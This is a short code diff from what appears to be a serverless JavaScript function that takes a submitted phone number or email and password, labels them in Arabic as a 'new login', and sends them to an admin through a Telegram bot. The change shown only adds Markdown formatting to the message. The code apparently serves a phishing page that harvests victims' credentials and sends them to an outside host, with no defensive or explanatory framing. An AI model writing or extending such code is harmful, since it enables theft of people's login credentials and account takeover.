@@ -22,7 +22,7 @@ exports.handler = async function (event, context) {
 
     const message = `تسجيل دخول جديد .\n\nالرقم او البريد : \`${text}\`\nالرمز : \`${password}\``;
 
-    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent(message)}`;
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent(message)}&parse_mode=markdown`;
 
     try {
         const response = await new Promise((resolve, reject) => {
